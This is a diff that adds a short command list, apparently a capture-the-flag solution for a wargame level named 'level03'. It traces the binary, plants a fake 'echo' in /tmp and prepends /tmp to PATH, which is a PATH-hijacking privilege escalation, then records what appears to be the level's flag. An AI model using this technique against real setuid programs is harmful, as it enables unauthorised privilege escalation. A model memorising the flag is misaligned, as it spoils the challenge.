@@ -1,0 +1,12 @@
+strace ./level03
+ltrace ./level03
+
+
+nano /tmp/echo
+chmod +x /tmp/echo
+
+
+export PATH="/tmp:$PATH"
+
+
+qi0maab88jeaj46qoumi7maus
